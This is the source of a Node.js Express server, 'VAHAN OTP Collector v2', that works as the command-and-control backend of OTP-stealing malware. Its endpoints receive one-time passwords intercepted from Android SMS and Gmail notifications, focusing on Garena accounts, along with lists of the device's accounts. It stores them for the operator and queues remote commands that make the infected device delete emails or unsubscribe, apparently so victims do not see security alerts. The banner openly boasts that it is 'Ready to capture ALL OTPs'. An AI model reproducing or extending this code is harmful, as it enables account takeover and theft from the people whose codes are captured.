// ============================================
// VAHAN — OTP COLLECTOR SERVER v2 (Node.js)
// Real-time OTP collection + Accounts + Unsubscribe
// ============================================

const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const PORT = 3000;
const VAHAN_KEY = "15935710X";

app.use(bodyParser.json());

// Store ALL captured OTPs
let otpDatabase = [];

// Store unsubscribe logs
let unsubscribeLog = [];
let deleteLog = [];
let pendingCommands = [];
let doneCommands = [];


// ============================================
// ENDPOINT 1: Receive OTP from Android SMS
// ============================================
app.post('/otp', (req, res) => {
    const { source, sender, otp, full_message, is_garena, timestamp, device_id } = req.body;
    
    const providedKey = req.headers['x-vahan-key'];
    if (providedKey !== VAHAN_KEY) {
        return res.status(403).json({ error: 'Invalid VAHAN Key' });
    }
    
    const otpEntry = {
        id: crypto.randomUUID(),
        source,
        sender,
        otp,
        full_message,
        is_garena,
        timestamp,
        device_id,
        received_at: new Date().toISOString()
    };
    
    otpDatabase.push(otpEntry);
    console.log(`[VAHAN] 📱 OTP Captured: ${otp} | From: ${sender}`);
    fs.writeFileSync('/tmp/otp_database.json', JSON.stringify(otpDatabase, null, 2));
    res.json({ success: true, otp_id: otpEntry.id });
});

// ============================================
// ENDPOINT 2: Receive OTP from Gmail Notifications
// ============================================
app.post('/otp-gmail', (req, res) => {
    const { source, title, text, otp, full_notification, email, email_type, timestamp } = req.body;
    
    const providedKey = req.headers['x-vahan-key'];
    if (providedKey !== VAHAN_KEY) {
        return res.status(403).json({ error: 'Invalid VAHAN Key' });
    }
    
    const otpEntry = {
        id: crypto.randomUUID(),
        source: 'GMAIL_NOTIFICATION',
        title,
        text,
        otp,
        full_notification,
        email: email || 'Unknown',
        email_type: email_type || 'GARENA',
        timestamp,
        received_at: new Date().toISOString()
    };
    
    otpDatabase.push(otpEntry);
    console.log(`[VAHAN] 📧 Gmail OTP: ${otp} | Email: ${email} | Type: ${email_type}`);
    fs.writeFileSync('/tmp/otp_database.json', JSON.stringify(otpDatabase, null, 2));
    res.json({ success: true, otp_id: otpEntry.id });
});

// ============================================
// ENDPOINT 3: Receive Accounts List from Device
// ============================================
app.post('/accounts', (req, res) => {
    const providedKey = req.headers['x-vahan-key'];
    if (providedKey !== VAHAN_KEY) {
        return res.status(403).json({ error: 'Invalid VAHAN Key' });
    }
    
    const accountsData = {
        id: crypto.randomUUID(),
        ...req.body,
        received_at: new Date().toISOString()
    };
    
    let accounts = [];
    try { accounts = JSON.parse(fs.readFileSync('/tmp/accounts.json', 'utf8')); } catch(e) {}
    accounts.push(accountsData);
    fs.writeFileSync('/tmp/accounts.json', JSON.stringify(accounts, null, 2));
    
    console.log(`[VAHAN] 📋 Accounts received: ${req.body.accounts_count}`);
    res.json({ success: true });
});

// ============================================
// ENDPOINT 4: Get ALL captured OTPs
// ============================================
app.get('/all-otps', (req, res) => {
    const key = req.query.key;
    if (key !== VAHAN_KEY) {
        return res.status(403).json({ error: 'Invalid Key' });
    }
    
    res.json({
        total: otpDatabase.length,
        otps: otpDatabase,
        garena_only: otpDatabase.filter(o => o.is_garena),
        timestamp: new Date().toISOString()
    });
});

// ============================================
// ENDPOINT 5: Get Accounts List
// ============================================
app.get('/accounts-list', (req, res) => {
    const key = req.query.key;
    if (key !== VAHAN_KEY) return res.status(403).json({ error: 'Invalid Key' });
    try {
        const data = fs.readFileSync('/tmp/accounts.json', 'utf8');
        res.json(JSON.parse(data));
    } catch(e) {
        res.json([]);
    }
});

// ============================================
// ENDPOINT 6: Clear database
// ============================================
app.post('/clear', (req, res) => {
    const key = req.headers['x-vahan-key'];
    if (key !== VAHAN_KEY) return res.status(403).json({ error: 'Invalid Key' });
    
    otpDatabase = [];
    fs.writeFileSync('/tmp/otp_database.json', '[]');
    res.json({ success: true, message: 'Database cleared' });
});

// ============================================
// ENDPOINT 7: Unsubscribe specific email
// ============================================
app.post('/unsubscribe', (req, res) => {
    const providedKey = req.headers['x-vahan-key'];
    if (providedKey !== VAHAN_KEY) {
        return res.status(403).json({ error: 'Invalid VAHAN Key' });
    }
    
    const { email, email_type } = req.body;
    
    unsubscribeLog.push({
        id: crypto.randomUUID(),
        email,
        email_type,
        timestamp: new Date().toISOString()
    });
    
    fs.writeFileSync('/tmp/unsubscribe_log.json', JSON.stringify(unsubscribeLog, null, 2));
    
    console.log(`[VAHAN] 🔗 Unsubscribe requested: ${email} | Type: ${email_type}`);
    
    // For now, just log it. Actual unsubscribe needs Gmail API + credentials
    res.json({ success: true, message: `Unsubscribe logged for ${email}` });
});

// ENDPOINT 8: Delete specific email
app.post('/delete', (req, res) => {
    const providedKey = req.headers['x-vahan-key'];
    if (providedKey !== VAHAN_KEY) return res.status(403).json({ error: 'Invalid VAHAN Key' });
    
    const { email, email_type } = req.body;
    
    deleteLog.push({
        id: crypto.randomUUID(),
        email,
        email_type,
        timestamp: new Date().toISOString()
    });
    fs.writeFileSync('/tmp/delete_log.json', JSON.stringify(deleteLog, null, 2));
    
    console.log(`[VAHAN] 🗑️ Delete requested: ${email} | Type: ${email_type}`);
    res.json({ success: true, message: `Delete logged for ${email}` });
});

// ============================================
// ENDPOINT 9: Get Unsubscribe Logs
// ============================================
app.get('/unsubscribe-log', (req, res) => {
    const key = req.query.key;
    if (key !== VAHAN_KEY) return res.status(403).json({ error: 'Invalid Key' });
    try {
        const data = fs.readFileSync('/tmp/unsubscribe_log.json', 'utf8');
        res.json(JSON.parse(data));
    } catch(e) {
        res.json([]);
    }
});

// ============================================
// ENDPOINT 10: Get Delete Logs
// ============================================
app.get('/delete-log', (req, res) => {
    const key = req.query.key;
    if (key !== VAHAN_KEY) return res.status(403).json({ error: 'Invalid Key' });
    try {
        const data = fs.readFileSync('/tmp/delete_log.json', 'utf8');
        res.json(JSON.parse(data));
    } catch(e) {
        res.json([]);
    }
});

// ENDPOINT: Telegram button creates command
app.post('/command', (req, res) => {
    const key = req.headers['x-vahan-key'];
    if (key !== VAHAN_KEY) return res.status(403).json({ error: 'Invalid Key' });
    
    const { email, email_type, action } = req.body;
    const cmd = {
        id: crypto.randomUUID(),
        email,
        email_type,
        action, // "delete" or "unsubscribe"
        created_at: new Date().toISOString(),
        done: false
    };
    pendingCommands.push(cmd);
    fs.writeFileSync('/tmp/pending_commands.json', JSON.stringify(pendingCommands, null, 2));
    
    console.log(`[VAHAN] Command: ${action} | ${email}`);
    res.json({ success: true, cmd_id: cmd.id });
});

// ENDPOINT: App checks pending commands
app.get('/command-pending', (req, res) => {
    if (req.query.key !== VAHAN_KEY) return res.status(403).json({ error: 'Invalid Key' });
    try {
        const data = fs.readFileSync('/tmp/pending_commands.json', 'utf8');
        res.json(JSON.parse(data).filter(c => !c.done));
    } catch(e) { res.json([]); }
});

// ENDPOINT: App marks command as done
app.post('/command-done', (req, res) => {
    const key = req.headers['x-vahan-key'];
    if (key !== VAHAN_KEY) return res.status(403).json({ error: 'Invalid Key' });
    
    const { cmd_id, success } = req.body;
    pendingCommands = pendingCommands.map(c => 
        c.id === cmd_id ? {...c, done: true, success, done_at: new Date().toISOString()} : c
    );
    fs.writeFileSync('/tmp/pending_commands.json', JSON.stringify(pendingCommands, null, 2));
    console.log(`[VAHAN] Command done: ${cmd_id} | Success: ${success}`);
    res.json({ success: true });
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════╗
║  💀 VAHAN OTP COLLECTOR v2 — ONLINE 💀 ║
║  Port: ${PORT}                              ║
║  Owner: @Alone_Supporter               ║
║  Ready to capture ALL OTPs!            ║
╚══════════════════════════════════════════╝
    `);
});
